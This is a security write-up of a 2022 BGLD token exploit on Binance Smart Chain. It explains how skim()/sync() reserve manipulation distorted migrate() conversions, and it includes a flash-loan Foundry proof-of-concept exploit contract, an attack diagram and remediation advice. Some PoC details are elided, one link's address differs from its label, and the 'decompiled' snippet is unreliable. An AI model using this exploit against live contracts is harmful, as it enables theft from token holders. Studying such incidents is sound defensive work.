# BGLD — migrate() + skim()/sync() Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | BGLD Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **Old BGLD** | [0xC2319E87280c64e2557a51Cb324713Dd8d1410a3](https://bscscan.com/address/0xC2319E87280c64e2557a51Cb324713Dd8d1410a3) |
| **New BGLD** | [0x169f715CaE1F94C203366a6890053E817C767B7C](https://bscscan.com/address/0x169f715CaE1F94C203366a6890053E817C767B7C) |
| **DEBT Token** | [0xC632F90affeC7121120275610BF17Df9963F181c](https://bscscan.com/address/0xC632F90affeC7121120275610BF17Df9963F181c) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **BGLD Proxy** | [0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb](https://bscscan.com/address/0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54104E256024E) |
| **DODO Flash Loan** | [0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4](https://bscscan.com/address/0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) |
| **Root Cause** | The `migrate()` function executed against pair reserve state manipulated via `skim()`/`sync()`, distorting the Old BGLD→New BGLD conversion ratio |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/BGLD_exp.sol) |

---
## 1. Vulnerability Overview

The BGLD protocol included a `migrate()` function supporting token migration from the old version (Old BGLD) to the new version (New BGLD). This function calculated the conversion ratio based on the pair's reserve state. The attacker flash-borrowed 125 WBNB from DODO and acquired Old BGLD by swapping WBNB→Old BGLD. They then used a combination of `skim()` and `sync()` on the pair to create a reserve imbalance, and by calling `Proxy.migrate()` in this state, received an excessive amount of New BGLD at the manipulated ratio. Additionally, the attacker flash-borrowed 950 DEBT from the New BGLD-DEBT pair to complete the arbitrage.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable migrate() — executable against manipulated reserve state
contract BGLDProxy {
    IUniswapV2Pair public oldBgldPair;
    IOldBGLD public oldBgld;
    INewBGLD public newBgld;

    // ❌ Conversion ratio calculated from pair reserves
    function migrate(uint256 oldAmount) external {
        oldBgld.transferFrom(msg.sender, address(this), oldAmount);

        // ❌ Uses distorted reserves after skim()/sync() manipulation
        (uint112 reserve0, uint112 reserve1,) = oldBgldPair.getReserves();
        uint256 ratio = uint256(reserve1) * 1e18 / uint256(reserve0);

        // ❌ Excess New BGLD minted using manipulated ratio
        uint256 newAmount = oldAmount * ratio / 1e18;
        newBgld.mint(msg.sender, newAmount);
    }
}

// ✅ Correct pattern — fixed ratio or TWAP-based migration
contract SafeBGLDProxy {
    uint256 public constant MIGRATION_RATIO = 1e18; // Fixed 1:1 ratio

    function migrate(uint256 oldAmount) external {
        oldBgld.transferFrom(msg.sender, address(this), oldAmount);

        // ✅ Uses a fixed ratio immune to external manipulation
        uint256 newAmount = oldAmount * MIGRATION_RATIO / 1e18;
        newBgld.mint(msg.sender, newAmount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**BGLD_decompiled.sol** — Entry point:
```solidity
// ❌ Root Cause: `migrate()` function executed against pair reserve state manipulated via `skim()`/`sync()`, distorting the Old BGLD→New BGLD conversion ratio
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 125 WBNB from DODO
    │
    ├─[2] Swap WBNB → Old BGLD (PancakeSwap)
    │       Acquire large amount of Old BGLD
    │
    ├─[3] Call skim() on the pair
    │       balanceOf(pair) >> reserve — create imbalance
    │
    ├─[4] Call sync() on the pair
    │       Update reserves to manipulated balance
    │       Distort Old BGLD/WBNB ratio
    │
    ├─[5] Call Proxy.migrate(oldBgldAmount)
    │       ❌ Receive excess New BGLD at manipulated reserve ratio
    │
    ├─[6] Flash loan 950 DEBT from New BGLD-DEBT pair
    │       Maximize profit with double flash loan
    │
    ├─[7] Execute arbitrage swaps
    │       Unwind manipulated position → Receive USDT
    │
    ├─[8] Repay DEBT flash loan
    │
    ├─[9] Repay WBNB flash loan (125 WBNB)
    │
    └─[10] Net profit: USDT/WBNB arbitrage gains
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBGLDProxy {
    function migrate(uint256 amount) external;
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IPair {
    function skim(address to) external;
    function sync() external;
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract BGLDExploit is Test {
    IERC20      WBNB      = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20      USDT      = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20      oldBGLD   = IERC20(0xC2319E87280c64e2557a51Cb324713Dd8d1410a3);
    IERC20      newBGLD   = IERC20(0x169f715CaE1F94C203366a6890053E817C767B7C);
    IERC20      DEBT      = IERC20(0xC632F90affeC7121120275610BF17Df9963F181c);
    IBGLDProxy  proxy     = IBGLDProxy(0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb);
    IRouter     router    = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDODO       dodo      = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(address(this)), 18);
        // [Step 1] Flash loan 125 WBNB from DODO
        dodo.flashLoan(125 * 1e18, 0, address(this), "");
        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] Swap WBNB → Old BGLD
        WBNB.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB); path[1] = address(oldBGLD);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );

        // [Steps 3–4] Manipulate reserves via skim() + sync()
        // ⚡ Create reserve imbalance, then lock in distorted ratio with sync()
        IPair oldPair = IPair(/* Old BGLD/WBNB pair */);
        oldPair.skim(address(this));
        oldPair.sync();

        // [Step 5] migrate() — receive excess New BGLD at manipulated reserve ratio
        oldBGLD.approve(address(proxy), type(uint256).max);
        proxy.migrate(oldBGLD.balanceOf(address(this)));

        // [Step 6] Double flash loan on New BGLD-DEBT pair
        IPair debtPair = IPair(/* NewBGLD-DEBT pair */);
        debtPair.swap(950 * 1e18, 0, address(this), abi.encode("debt_flash"));

        // Repay flash loan
        WBNB.transfer(address(dodo), amount);
    }

    function pancakeCall(address, uint256 amount, uint256, bytes calldata) external {
        // DEBT flash loan callback: repay DEBT after arbitrage
        // ... arbitrage logic ...
        DEBT.transfer(msg.sender, amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Conversion ratio distorted via migrate() + skim()/sync() reserve manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation + migration vulnerability |
| **Attack Vector** | DODO 125 WBNB flash loan → WBNB→OldBGLD → `skim()`+`sync()` → `migrate()` → double flash loan arbitrage |
| **Preconditions** | `migrate()` uses AMM reserve ratio as conversion basis; `skim()`/`sync()` callable on the pair by external actors |
| **Impact** | WBNB/USDT arbitrage profit (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Fixed Migration Ratio**: Use a governance-configured fixed value for the conversion ratio inside `migrate()` to eliminate the impact of AMM price manipulation.
2. **Use TWAP Pricing**: If an AMM price reference is required, use a TWAP of 30 minutes or more to prevent single-block manipulation.
3. **Restrict skim()/sync() Access**: Disable or restrict external caller access to `skim()` on pairs that include fee-on-transfer tokens.
4. **Migration Pause Mechanism**: Add an emergency stop capability that can pause `migrate()` upon detection of anomalous pricing.

---
## 7. Lessons Learned

- **Price Dependency in Migration Functions**: When a token migration function uses the AMM price as the conversion ratio, it is directly exposed to price manipulation attacks. Migration logic should be independent of price.
- **Danger of Combining skim()/sync()**: `skim()` and `sync()` appear harmless in isolation, but when combined they can set the reserve state to an arbitrary value. External access to these two functions should be restricted.
- **Double Flash Loan Attacks**: The pattern of supplementing insufficient capital from a single flash loan with a double flash loan (WBNB + DEBT) is on the rise. Flash loan defenses must account not only for single flash loans but also for nested flash loans.